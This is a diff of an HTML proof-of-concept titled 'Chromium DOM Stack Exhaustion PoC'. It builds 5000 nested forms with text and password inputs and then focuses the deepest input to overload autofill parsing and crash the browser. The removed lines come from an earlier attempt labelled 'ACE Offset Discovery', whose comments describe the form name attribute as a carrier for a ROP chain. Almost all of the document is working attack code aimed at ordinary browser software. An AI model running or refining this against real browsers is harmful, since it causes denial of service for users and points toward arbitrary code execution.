@@ -1,38 +1,30 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Chromium DOM Stack Exhaustion PoC</title>
+</head>
 <body>
-    <h3>ACE Offset Discovery...</h3>
     <div id="root"></div>
     <script>
-        function buildPattern(length) {
-            let p = "";
-            let chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            for (let i = 0; i < length; i++) {
-                p += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return p;
-        }
-
-        const root = document.getElementById('root');
-        const pattern = buildPattern(1024); // Smaller, targeted buffer
-
         function trigger() {
-            let current = root;
-            // We use the 'name' attribute as our carrier for the ROP chain
-            for (let i = 0; i < 2000; i++) {
+            let current = document.getElementById('root');
+            for (let i = 0; i < 5000; i++) {
                 let f = document.createElement('form');
-                let tag = buildPattern(8); // Unique string for every level
-                f.setAttribute('name', 'TAG_' + i + '_' + pattern); 
+                let input1 = document.createElement('input');
+                input1.type = "text";
+                let input2 = document.createElement('input');
+                input2.type = "password";
+                f.appendChild(input1);
+                f.appendChild(input2);
                 current.appendChild(f);
                 current = f;
             }
-            
-            // Trigger the C++ crawler
-            if (window._AutofillMessageHandler) {
-                window._AutofillMessageHandler.postMessage('{"action":"request_autofill"}');
-            }
+            // Force layout recalculation / Autofill parsing
+            let deepInput = current.querySelector('input');
+            if(deepInput) deepInput.focus();
         }
-        setTimeout(trigger, 1000);
+        setTimeout(trigger, 500);
     </script>
 </body>
 </html>
